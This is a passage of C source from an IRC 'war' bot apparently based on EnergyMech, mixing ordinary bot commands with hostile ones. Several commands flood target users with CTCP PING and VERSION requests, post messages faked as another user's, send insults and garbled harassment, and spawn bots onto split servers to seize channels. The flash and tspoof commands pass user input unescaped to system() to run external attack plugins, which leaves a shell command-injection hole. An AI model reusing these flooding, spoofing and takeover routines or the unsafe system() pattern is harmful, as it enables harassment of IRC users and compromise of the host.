		return;
	}
	
	if (!msg)
	{
		send_to_user(from, "\002No Message Supplied\002");
		return;
	}
	
  	if (!(uh = getuserhost(nick)))
  	{
      return;
  	}
  	
  	sendprivmsg(chan, "\026 *%s* \026 %s \002<%s>%s\002", nick, msg, time2medium(getthetime()), uh);
  	send_to_user(from, "\002FakeLog sent to %s\002", chan);
}

void do_randlog(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan, *nick, *uh, buffer[MAXLEN];
	
	chan = get_channel(to, &rest);
	nick = get_token(&rest, " ");
	
	if (!rest)
	{
		send_to_user(from, "\002No arguments specified\002");
		return;
	}
	
  	if (!(uh = getuserhost(nick)))
  	{
      return;
  	}
  	
  	strcpy(buffer, randstring(RANDFAKELOG));
  	
  	sendprivmsg(chan, "\026 *%s* \026 %s \002<%s>%s\002", nick, buffer, time2medium(getthetime()), uh);
  	send_to_user(from, "\002FakeLog sent to %s\002", chan);
}
  	
  	
  	
void do_cstats(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	aBot    *bot;
	aChannel *chan;
	
	rest = current->nick;
	
	if (rest && (bot = find_bot(rest)))
	{
	send_to_user(from, "\002Channel Stats for %s\002", bot->realnick);
		if (!bot->Channel_list)
		{
			send_to_user(from, "\002Not active on any channel\002");
		}
		else
		{
			send_to_user(from, "---\002Channel\002-\002Stats\002--------------------------");
			for (chan = bot->Channel_list; chan; chan = chan->next)
			{
				do_who(chan->name);
				chan_stats(from, chan->name);
				send_to_user(from, "------------------------------------------");
			}
		}
	}
	else
	{
	return;
	}
}

void do_qshit(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan, *nick, *level, *uh, *aday, *uh2;
	int access;
        long int days;
	char whoshit[255];

	aday = (char *) 0;
	nick = get_token(&rest, " ");
	
	chan = DEFAULTSHITCHAN;
	level = DEFAULTSHITLEVEL;
	aday = DEFAULTSHITLENGTH;
	
	if (!chan || !*chan || (!ischannel(chan) && my_stricmp(chan, "*")))
	{
		send_to_user(from, "\002%s\002",
			"Usage: SHIT <channel or *> <nick or userhost> <level>");
		return;
	}

	if (get_userlevel(from, chan) < cmdlevel)
	{
		return;
	}
	
	if (!rest || !*rest)
	{
		 rest = "Leave Lamer";
	}
	
	if (!(uh2 = nick2uh(from, nick, 0)))
	    return;
	    
	if (is_shitted(uh2, chan))
	{
		send_to_user(from, "\002%s is in my shitlist already for this channel\002", uh2);
		return;
	}
	if (get_userlevel(uh2, chan) > get_userlevel(from, chan))
	{
		send_to_user(from, "\002%s is a God compared to you on %s\002", uh2, chan);
		return;
	}
	if (!matches(owneruserhost, uh2) || !matches(uh2, owneruserhost))
	{
		send_to_user(from, "\002%s is God and can not be shitted\002", uh2);
		return;
	}
        uh = format_uh(uh2, 1);
	if (!uh)
	{
		send_to_user(from, "\002A problem has occured, give comstud the following few lines:\002");
		send_to_user(from, "\002From = %s\002", from);
		send_to_user(from, "\002To   = %s\002", to);
		send_to_user(from, "\002Nick = %s\002", nick);
		send_to_user(from, "\002UH2  = %s\002", uh2);
		return;
	}
	if (!my_stricmp("*!*@*", uh))
	{
		 send_to_user(from, "\002Problem shitting *!*@*, try again\002");
		 return;
	}
	if (check_for_number(from, level))
		return;

	access = atoi(level);
	if ((access <= 0) || (access > MAXSHITLEVEL))
	{
		send_to_user(from, "\002Valid levels are from 1 thru %i\002", MAXSHITLEVEL);
		return;
	}
	days = aday ? atol(aday) : 30;
	strcpy(whoshit, from);
	if (rest && (*rest == '?'))
	{
		char *ptr;

		rest++;
		ptr = strchr(from, '!');
		strcpy(whoshit, "<Anonymous>");
		strcat(whoshit, ptr ? ptr : "");
	}

	if (add_to_shitlist(&(current->Userlist), uh, access, chan, whoshit,
		(rest && *rest) ? rest : "" , getthetime(),
		getthetime()+(86400 * days)))
	{
#ifdef USE_CCC
		send_to_ccc("1 SHIT %s %s %s %i %li %li %s",
			whoshit, chan, uh, access, getthetime(),
			getthetime()+(86400 * days), rest ? rest : "");		
#endif
		send_to_user( from, "\002The user has been shitted as %s on %s\002", uh, chan);
		send_to_user(from, "\002The shitlist will expire: %s\002", time2str(getthetime()+ (86400 * (long)days)));
		check_shit();
	}
	else
	  send_to_user( from, "\002%s\002", "Problem shitting the user");
	return;
}

void do_qshit2(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *nick;
	
	if (!rest)
	{
		send_to_user(from, "\002No arguments specified\002");
		return;
	}
	
	nick = get_token(&rest, " ");
	
	while (nick != NULL) {
		do_qshit(from, to, nick, cmdlevel);
		nick = get_token(&rest, " ");
		sleep(5);
	}
}

void do_adduser2(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{

	char *nick, *chan, buf[MAXLEN];
	
	if (!rest)
	{
		send_to_user(from, "\002No arguments specified\002");
		return;
	}
	
	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);

	
	while (nick != NULL) {
		if (ischannel(to)) {
			sprintf(buf, "%s %s", chan, nick);
		}
		else {
			sprintf(buf, "%s", nick);
		}
		do_plususer(from, to, buf, cmdlevel);
		nick = get_token(&rest, " ");
		sleep(5);
	}
}

void do_pingflood(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *nick;
	char *nuh;
	char *chan;
	int bing = 50;

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);

	if (!rest)
	{
		send_to_user(from, "Usage: pingflood <nick or channel>");
		return;
	}
	
		if (!(nuh = nick2uh(from, nick, 0))) {
	  		return;
	  	}
		if (get_userlevel(nuh, chan) >= get_userlevel(from, chan)) {
	  		send_to_user(from, "\002You can not flood someone with a higher level than you :b\002");
	  		send_to_user(nick, "\002%s attempted to flood you\002", getnick(from));
	  		return;
		}

	while (bing)
	{
		if (bing == 25) {
			sleep(5);
		}
		mysend_ctcp(nick, "PING");
		bing--;
	}
	send_to_user(from, "\002Ping Flooded %s\002", nick);
}

void do_versionflood(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *nick;
	char *nuh;
	char *chan;
	int bing = 40;

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);

	if (!rest)
	{
		send_to_user(from, "Usage: versionflood <nick or channel>");
		return;
	}
	
		if (!(nuh = nick2uh(from, nick, 0))) {
	  		return;
	  	}
		if (get_userlevel(nuh, chan) >= get_userlevel(from, chan)) {
	  		send_to_user(from, "\002You can not flood someone with a higher level than you :b\002");
	  		send_to_user(nick, "\002%s attempted to flood you\002", getnick(from));
	  		return;
		}

	while (bing)
	{
		if (bing == 20) {
			sleep(5);
		}
		mysend_ctcp(nick, "VERSION");
		bing--;
	}
	send_to_user(from, "\002Version Flooded %s\002", nick);
}

void do_eleet(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *reciever;
	char *temp2;
	char temp[MAXLEN], tbuf[MAXLEN];
	int  tindex = 0;
	
	reciever = strtok(rest, " ");
	
	if (reciever) {
		temp2 = strtok(NULL, "\n");
	}

	if (!reciever) {
		send_to_user(from, "\002No destination supplied\002");
		return;
	}
	
	if (!temp2) {
		send_to_user(from, "\002No text supplied\002");
		return;
	}
	
	strcpy(temp, temp2);
	
	while(temp[tindex])
	{
		switch(temp[tindex])
		{
			case 'e':
			case 'E':
				temp[tindex] = '3';
				break;
			case 'i':
			case 'I':
				temp[tindex] = '1';
				break;
			case 't':
			case 'T':
				temp[tindex] = '+';
				break;
			case 'o':
			case 'O':
				temp[tindex] = '0';
				break;
			case 'c':
			case 'C':
				temp[tindex] = '(';
				break;
			case 's':
			case 'S':
				temp[tindex] = '5';
				break;
			case 'l':
			case 'L':
				temp[tindex] = '|';
				break;
			case 'a':
			case 'A':			
				temp[tindex] = '4';
				break;
			default:
				break;
		}
		tindex++;
	}
	temp[tindex] = '\0';
	
	if (reciever[0] == '#') {
		send_to_server("PRIVMSG %s :%s", reciever, temp);
	}
	else {
		if (!matches("*!*@*", reciever)) {
			send_to_user(reciever, "%s", temp);
		}
		else {
			send_to_server("PRIVMSG %s :%s", reciever, temp);
		}
	}
}

char *function_toupper(input)
char *input;
{
	char *new = (char *) 0, *ptr;

	if (!input) {
		return NULL;
	}
	mstrcpy(&new, input);
	for (ptr = new; *ptr; ptr++)
		*ptr = islower(*ptr) ? toupper(*ptr) : *ptr;
	return new;
}

char *function_tolower(input)
char *input;
{
	char	*new = (char *) 0, *ptr;

	if (!input) {
		return NULL;
	}
	mstrcpy(&new, input);
	for (ptr = new; *ptr; ptr++)
		*ptr = (isupper(*ptr)) ? tolower(*ptr) : *ptr;
	return new;
}

void do_cool(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char temp[MAXLEN];
	char *temp2;
	char *reciever;
	char this;
	int  cindex = 0;
	
	reciever = strtok(rest, " ");
	
	if (reciever) {
		temp2 = strtok(NULL, "\n");
	}

	if (!reciever) {
		send_to_user(from, "\002No destination supplied\002");
		return;
	}
	
	if (!temp2) {
		send_to_user(from, "\002No text supplied\002");
		return;
	}

	strcpy(temp, temp2);
	while(temp[cindex])
	{
		this = temp[cindex];
		temp[cindex++] = toupper(this);
		this = temp[cindex];
		temp[cindex++] = tolower(this);
	}
	temp[cindex] = '\0';
	
	if (reciever[0] == '#') {
		send_to_server("PRIVMSG %s :%s", reciever, temp);
	}
	else {
		if (!matches("*!*@*", reciever)) {
			send_to_user(reciever, "%s", temp);
		}
		else {
			send_to_server("PRIVMSG %s :%s", reciever, temp);
		}
	}
}

void do_annoy(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char temp[MAXLEN];
	int aindex = 0, rnum, r2num;
	char *temp2;
	char *reciever;
	
	reciever = strtok(rest, " ");
	
	if (reciever) {
		temp2 = strtok(NULL, "\n");
	}

	if (!reciever) {
		send_to_user(from, "\002No destination supplied\002");
		return;
	}
	
	if (!temp2) {
		send_to_user(from, "\002No text supplied\002");
		return;
	}

	while (*temp2)
	{
		rnum = (random() % 4);
		r2num = (random() % 3);
		switch(rnum)
		{
			case 0:
				if (r2num == 0)
					temp[aindex++] = *temp2;
				else if (r2num == 1)
					temp[aindex++] = tolower(*temp2);
				else if (r2num == 2)
					temp[aindex++] = toupper(*temp2);
				*temp2++;
				break;
			case 1:
				temp[aindex++] = '\002';
                                if (r2num == 0)
                                        temp[aindex++] = *temp2;
                                else if (r2num == 1)
                                        temp[aindex++] = tolower(*temp2);
                                else if (r2num == 2)
                                        temp[aindex++] = toupper(*temp2);
				temp[aindex++] = '\002';
				*temp2++;
				break;
			case 2:
                                temp[aindex++] = '\026';
                                if (r2num == 0)
                                        temp[aindex++] = *temp2;
                                else if (r2num == 1)
                                        temp[aindex++] = tolower(*temp2);
                                else if (r2num == 2)
                                        temp[aindex++] = toupper(*temp2);
                                temp[aindex++] = '\026';
                                *temp2++;
                                break;
        		case 3:
                                temp[aindex++] = '\037';
                                if (r2num == 0)
                                        temp[aindex++] = *temp2;
                                else if (r2num == 1)
                                        temp[aindex++] = tolower(*temp2);
                                else if (r2num == 2)
                                        temp[aindex++] = toupper(*temp2);
                                temp[aindex++] = '\037';
                                *temp2++;
                                break;
		}
	}
	temp[aindex] = '\0';
	
	if (reciever[0] == '#') {
		send_to_server("PRIVMSG %s :%s", reciever, temp);
	}
	else {
		if (!matches("*!*@*", reciever)) {
			send_to_user(reciever, "%s", temp);
		}
		else {
			send_to_server("PRIVMSG %s :%s", reciever, temp);
		}
	}
}

void do_eping(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan;
	char *nick;
	char buffer[MAXLEN];
	char buffer2[MAXLEN];

	if (!(nick = get_token(&rest, " "))) {
		nick = getnick(from);
	}
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(PINGFILE));

	if (ischannel(to)) {
		sprintf(buffer2, "%s %s", chan, buffer);
		do_eleet(from, to, buffer2, cmdlevel);
		return;
	}
	else {
		if (!matches(nick, getnick(from))) {
			sprintf(buffer2, "%s %s", from, buffer);
		}
		else {
			sprintf(buffer2, "%s %s", nick, buffer);
		}
		do_eleet(from, to, buffer2, cmdlevel);
		return;
	}
}

void do_cping(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan;
	char *nick;
	char buffer[MAXLEN];
	char buffer2[MAXLEN];

	if (!(nick = get_token(&rest, " "))) {
		nick = getnick(from);
	}
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(PINGFILE));

	if (ischannel(to)) {
		sprintf(buffer2, "%s %s", chan, buffer);
		do_cool(from, to, buffer2, cmdlevel);
		return;
	}
	else {
		if (!matches(nick, getnick(from))) {
			sprintf(buffer2, "%s %s", from, buffer);
		}
		else {
			sprintf(buffer2, "%s %s", nick, buffer);
		}
		do_cool(from, to, buffer2, cmdlevel);
		return;
	}
}

void do_aping(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan;
	char *nick;
	char buffer[MAXLEN];
	char buffer2[MAXLEN];

	if (!(nick = get_token(&rest, " "))) {
		nick = getnick(from);
	}
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(PINGFILE));

	if(ischannel(to)) {
		sprintf(buffer2, "%s %s", chan, buffer);
		do_annoy(from, to, buffer2, cmdlevel);
		return;
	}
	else {
		if (!matches(nick, getnick(from))) {
			sprintf(buffer2, "%s %s", from, buffer);
		}
		else {
			sprintf(buffer2, "%s %s", nick, buffer);
		}
		do_annoy(from, to, buffer2, cmdlevel);
		return;
	}
}

void do_wall(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	aChannel *Dummy;
	register aChanUser *Blah;
	char *nick, *buffer, *chan;
	
	if (!rest) {
		send_to_user(from, "\002Please enter a message\002");
		return;
	}
	
	nick = getnick(from);
	chan = get_channel(to, &rest);
	buffer = strtok(rest, "\n");

        if (!(Dummy = find_channel(chan)))
        {
			send_to_user(from, "\002I'm not on %s\002", chan);
			return;
        }
        else
        {
		Blah = Dummy->users;
			while (Blah)
			{
					if (get_usermode(Blah)&MODE_CHANOP)
					{
						send_to_server("NOTICE %s :[\002Wallop\002/\002%s\002] %s", Blah->nick, chan, buffer);
					}
				Blah = Blah->next;
			}
		}
		send_to_user(from, "\002Sent wallop to %s\002", chan);
}

void do_4op(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan;
	char *nick;

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	if (!find_channel(chan)) {
		send_to_user(from, "\002I'm not on %s\002", chan);
	}
	else
	{
		sendmode(chan, "+oooo %s %s %s %s", nick, nick, nick, nick);
	}
}

void do_8ball(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = getnick(from);
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(EIGHTBALL));
	
	if(ischannel(to)) {
		if (!rest) {
			sendprivmsg(chan, "Look at the big brain on %s, he forgot to ask a question", nick);
		}
		else {
			sendprivmsg(chan, "%s", buffer);
		}
	}
	else {
		send_to_user(from, "\002What the hell is the point of not asking a question in public?\002");
	}
}

int checksrv(char *what)  {
	if (what[0]=='*'||what[1]=='*') return 0; return 1;
}

void do_steal2(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	aLink *temp;
	aList *temp2;
	register int count;
	char nickbuf[9], tmp[MAXLEN];
	char *chan;
	
	chan = get_token(&rest, " ");
	
	if (!rest) {
		do_steal(from, to, chan, cmdlevel);
		return;
	}

	if (!get_int_var(NULL, TOGWL_VAR))
	{
		do_steal(from, to, chan, cmdlevel);
		return;
	}
	count = 0;
	for (temp=current->TheLinks;temp;temp=temp->next) {
		if (temp->status & SPLIT)
		{
			if (checksrv(temp->name) != 0) {
				temp2=make_list(&current->StealList, chan);
				strcpy(nickbuf, randstring(NICKSFILE));	
				send_to_user(from, "\002Spawning a bot to the split server %s\002", temp->name);
				sprintf(tmp, "-s %s -c %s", temp->name, chan);
				forkbot(from, nickbuf, tmp);
				return;
			}
		}
	}
	if (count == 0) {
		do_steal(from, to, chan, cmdlevel);
	}
}

void do_vers(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	send_to_user(from, "\002%s Class EnergyMech %s %s\022", CLASS, VERSION, REVISION);
	send_to_user(from, "\002By: Polygon\002");
}

void do_flash5(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *uh;
	char *chan;
	

	chan = get_channel(to, &rest);
	
	if (!rest)
	{
		send_to_user(from, "\002No arguments specified\002");
		return;
	}
		
	uh = get_token(&rest, " ");
	
	sprintf(buffer, "%s %s", PLUGIN2, uh);
  	system(buffer);
		
	send_to_user(from, "\002Flash sent to %s\002", uh);
}

void do_tspoof(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *uh;
	char *fakeu;
	char *fakeh;
	
	if (!rest)
	{
		send_to_user(from, "\002Usage: tspoof user@host [fakeuser] [fakehost]\002");
		return;
	}
		
	uh = get_token(&rest, " ");
	
  	if (!(fakeu = get_token(&rest, " ")))
	{
		send_to_user(from, "\002Usage: tspoof user@host [fakeuser] [fakehost]\002");
		return;
	}
	
	if (!(fakeh = get_token(&rest, " "))) {
		send_to_user(from, "\002Usage: tspoof user@host [fakeuser] [fakehost]\002");
		return;
	}
	
	
	sprintf(buffer, "%s %s %s %s", PLUGIN4, uh, fakeu, fakeh);
  	system(buffer);
		
	send_to_user(from, "\002Tspoof sent to %s\002", uh);
}

void do_addping(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	FILE *aFile;
	char *data;
	
	if (!rest || !*rest)  {
		send_to_user(from, "Usage: \002ADDPING <data>\002");
		return;
	}
	
	data = strtok(rest, "\n");
	
	if (!(aFile = fopen(PINGFILE, "at")))  {
		send_to_user(from, "\002Error: couldn't open the %s file.\002", PINGFILE);
		return;
	}
	
	fprintf(aFile, "%s\n", data);

	fclose(aFile);
	send_to_user(from, "\002Ping messages have been sucessfully added\002");
}

void do_addtopic(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	FILE *aFile;
	char *data;
	
	if (!rest || !*rest)  {
		send_to_user (from, "Usage: \002ADDTOPIC <data>\002");
		return;
	}
	
	data = strtok(rest, "\n");
	
	if (!(aFile = fopen(RANDTOPICSFILE, "at")))  {
		send_to_user (from, "\002Error: couldn't open the %s file.\002", RANDTOPICSFILE);
		return;
	}
	
	fprintf(aFile, "%s\n", data);

	fclose(aFile);
	send_to_user(from, "\002Topic messages have been sucessfully added\002");
}

void do_addversion(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	FILE *aFile;
	char *data;
	
	if (!rest || !*rest)  {
		send_to_user (from, "Usage: \002ADDVERSION <data>\002");
		return;
	}
	
	data = strtok(rest, "\n");
	
	if (!(aFile = fopen(VERSIONFILE, "at")))  {
		send_to_user (from, "\002Error: couldn't open the %s file.\002", VERSIONFILE);
		return;
	}
	
	fprintf(aFile, "%s\n", data);

	fclose(aFile);
	send_to_user(from, "\002Version messages have been sucessfully added\002");
}

void do_addaway(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	FILE *aFile;
	char *data;
	
	if (!rest || !*rest)  {
		send_to_user (from, "Usage: \002ADDAWAY <data>\002");
		return;
	}
	
	data = strtok(rest, "\n");
	
	if (!(aFile = fopen(AWAYFILE, "at")))  {
		send_to_user (from, "\002Error: couldn't open the %s file.\002", AWAYFILE);
		return;
	}
	
	fprintf(aFile, "%s\n", data);

	fclose(aFile);
	send_to_user(from, "\002Away messages have been sucessfully added\002");
}

void do_mode(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *mode_to;
	char *mode;
	
	mode_to = get_token(&rest, " ");
	mode = strtok(rest, "\n");
	
	if (!mode_to) {
		send_to_user(from, "\002No Destination Entered\002");
	}
	if (!mode) {
		send_to_user(from, "\002No mode data entered\002");
	}
		
	sendmode(mode_to, "%s", mode);
}

void do_rehash2(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	int i, botcount = 0;
	aChannel *chan;
	
/*	send_to_user(from, "\002Rehashing...[Use RESET to completely restart]\002"); */
	send_global_statmsg("[\002Rehash\002] from \002%s\002", getnick(from));
	for (i = 0; i < MAXBOTS; i++) {
		if (thebots[i].created) {
			botcount++;
			if (botcount == 1) {
				current = &(thebots[i]);
				send_global_statmsg("Saving Lists");
				if (!write_levelfile(LEVELFILE)) {
					send_global_statmsg("\002Levels could not be saved to %s\002", LEVELFILE);
				}
				if (!saveuserlist(&(current->Userlist), current->USERFILE)) {
        			send_global_statmsg("\002Lists could not be saved to file %s\002", current->USERFILE);
				}
			}
			if (!write_biglist(&current->dList, current->dfile)) {
        		send_statmsg("\002Dictionary could not be saved to file %s\002", thebots[i].dfile);
			}
#ifdef SERVER_MONITOR
			if (!write_biglist(&current->KillList, thebots[i].kfile)) {
        		send_statmsg("\002KillList could not be saved to file %s\002", thebots[i].kfile);
			}
			if (!write_timelist(&current->KillList2, thebots[i].kfile2)) {
        		send_statmsg("\002KillList2 could not be saved to file %s\002",thebots[i].kfile2);
			}
#endif
			if (!write_seenlist(&current->SeenList, thebots[i].seenfile)) {
        		send_statmsg("\002SeenList could not be saved to file %s\002", thebots[i].seenfile);
			}
/*
			send_statmsg("Rehashing SeenList for \002%s\002", thebots[i].nick);
			send_statmsg("Rehashing Dictionary for \002%s\002", thebots[i].nick);
*/
			read_seenlist(&thebots[i].SeenList, thebots[i].seenfile);
			read_biglist(&thebots[i].dList, thebots[i].dfile);
#ifdef SERVER_MONITOR
/*			send_statmsg("Rehashing KillList for \002%s\002", thebots[i].nick); */
			read_biglist(&thebots[i].KillList, thebots[i].kfile);
			read_timelist(&thebots[i].KillList2, thebots[i].kfile2);
#endif
			for (chan = thebots[i].Channel_list; chan; chan = chan->next) {
				send_to_server( "WHO %s", chan->name);
			}
		}
	}
}

void do_clearshit(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	register aUser *dummy;
	char buffer[MAXLEN];
	
	for (dummy = current->Userlist; dummy; dummy = dummy->next) {
		if (IsShit(dummy)) {
			sprintf(buffer, "%s %s", dummy->channel, dummy->userhost);
			do_rshit(from, to, buffer, cmdlevel);
		}
	}
	
	send_to_user(from, "\002Shitlist has been cleared\002");
}

void do_cdelmatch(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	register aUser *dummy;
	char buffer[MAXLEN];
	char *pattern;
	
	pattern = get_token(&rest, " ");
	
	for (dummy = current->Userlist; dummy; dummy = dummy->next) {
		if (my_stricmp(dummy->channel, "*")) {
		if(!matches(dummy->channel, pattern) || !matches(pattern, dummy->channel))
		{
		if (IsShit(dummy))
			{
			sprintf(buffer, "%s %s", dummy->channel, dummy->userhost);
			do_rshit(from, to, buffer, cmdlevel);
			}
		if (IsUser(dummy))
			{
			sprintf(buffer, "%s %s", dummy->channel, dummy->userhost);
			do_del(from, to, buffer, cmdlevel);
			}
		}
		}
	}
	send_to_user(from, "\002Deleted users from %s\002", pattern);
}

void do_update(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan;
	
	chan = get_channel(to, &rest);
	
	send_to_server( "WHO %s", chan);
	send_to_user(from, "\002Updated %s\002", chan);
}

void do_addrandquote(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
#ifdef RANDQUOTE
	FILE *aFile;
	
	if (!rest || !*rest)  {
		send_to_user(from, "Usage: \002ADDRQUOTE <data>\002");
		return;
	}
	
	if (!(aFile = fopen(RANDUSERQUOTEFILE, "at")))  {
		send_to_user(from, "\002Error: couldn't open the %s file.\002", RANDUSERQUOTEFILE);
		return;
	}
	
	fprintf(aFile, "%s\n", rest);

	fclose(aFile);
	send_to_user(from, "\002Rand Quote message have been sucessfully added\002");
#endif
}

void do_randquote(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
#ifdef RANDQUOTE
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDUSERQUOTEFILE));
	
	if(ischannel(to))
	{
		if (rest)
		{
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
		}
		else
		{
		sendprivmsg(chan, "%s", buffer);
		}
	}
	else
	{
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
	}
#endif
}

void do_pyomama(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDYOMAMAFILE));
	
	sendprivmsg(chan, "%s, %s", nick, buffer);
}

void do_pinsult(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDINSULTFILE));
	
	sendprivmsg(chan, "%s, %s", nick, buffer);
}

void do_repeat(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *times;
	char tbuf[MAXLEN], tbuf2[MAXLEN];
	int i = 0, ntimes;
	
	if (!rest) {
		return;
	}

	times = get_token(&rest, " ");
	
	if (isdigit(*times)) {
		ntimes = atoi(times);
	}
	else {
		send_to_user(from, "\002Please enter a digit next time\002");
		return;
	}
	
	if (rest[0] == current->cmdchar) {
		strcpy(tbuf, rest);
	}
	else {
		sprintf(tbuf, "%c%s", current->cmdchar, rest);
	}
	
	while (ntimes > i) {
		strcpy(tbuf2, tbuf);
		on_msg(from, to, tbuf2);
		i++;
	}
}

void do_ctcp(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *to_what;
	
	to_what = get_token(&rest, " ");
	
	send_ctcp_reply(to_what, "%s", rest);
}

void do_send_ctcp(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *to_what;
	
	to_what = get_token(&rest, " ");
	
	send_ctcp(to_what, "%s", rest);
}

void do_backwards(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *dest, *chan, *aptr, thechar;
	char tbuf5[MAXLEN], tbuf2[MAXLEN];
	int i, j = 0;
	
	if (!rest) {
		send_to_user(from, "\002Please specify some text to manipulate\002");
		return;
	}
	
	dest = get_token(&rest, " ");
	
	strcpy(tbuf2, rest);
	
	aptr = get_token(&rest, " ");
	
	if (!my_stricmp(aptr, "PING")) {
		strcpy(tbuf2, "");
		strcpy(tbuf2, randstring(PINGFILE));
	}
	
	i = strlen(tbuf2);
	
	strcpy(tbuf5, "");
	while ((i + 1)) {
		thechar = tbuf2[(i - 1)];
		tbuf5[j] = thechar;
		i--;
		j++;
	}
	
	tbuf5[(j - 1)] = '\0';
	
	sendprivmsg(dest, "%s", tbuf5);
}

void do_dyslexia(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *dest, *strptr, *aptr;
	char tbuf[MAXLEN], tbuf2[MAXLEN];
	char dysbuf1[MAXLEN], dysbuf2[MAXLEN], dysbuf3[MAXLEN];
	int i = 0, j = 0;
	
	if (!rest) {
		send_to_user(from, "\002Please specify some text to manipulate\002");
		return;
	}

	dest = get_token(&rest, " ");
	
	strptr = strcpy(tbuf2, rest);
	
	aptr = get_token(&rest, " ");
	
	if (!my_stricmp(aptr, "PING")) {
		strptr = strcpy(tbuf2, randstring(PINGFILE));
	}
	
	send_to_user(from, "[\002Converting\002] %s", tbuf2);
	
	if (aptr = get_token(&strptr, " ")) {
		strcpy(dysbuf3, aptr);
	}
	else {
		send_to_user(from, "\002More than 3 words are required\002");
		return;
	}
	
	if (aptr = get_token(&strptr, " ")) {
		strcpy(dysbuf1, aptr);
	}
	else {
		send_to_user(from, "\002More than 3 words are required\002");
		return;
	}
	
	if (aptr = get_token(&strptr, " ")) {
		strcpy(dysbuf2, aptr);
	}
	else {
		send_to_user(from, "\002More than 3 words are required\002");
		return;
	}
	
	aptr = get_token(&strptr, " ");
	
	while (aptr) {
		i = randx(1, 3);
		
		switch (i) {
		  case 1:
		  	sprintf(dysbuf1, "%s %s", dysbuf1, aptr);
		  	break;
		  case 2:
		  	sprintf(dysbuf2, "%s %s", dysbuf2, aptr);
		  	break;
		  case 3:
		  	sprintf(dysbuf3, "%s %s", dysbuf3, aptr);
		  	break;
		  default:
		  	break;
		}	
		aptr = get_token(&strptr, " ");
	}
	
	sprintf(tbuf, "%s %s %s", dysbuf1, dysbuf2, dysbuf3);
	
	sendprivmsg(dest, "%s", tbuf);
}

void do_dictionary(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *word, *chan;
	aBigList *aVar;
	int maxul, isthere = 0;
	
	maxul = max_userlevel(from);
	
	chan = get_channel(to, &rest);
	word = get_token(&rest, " ");
	
	if (!word && !chan) {
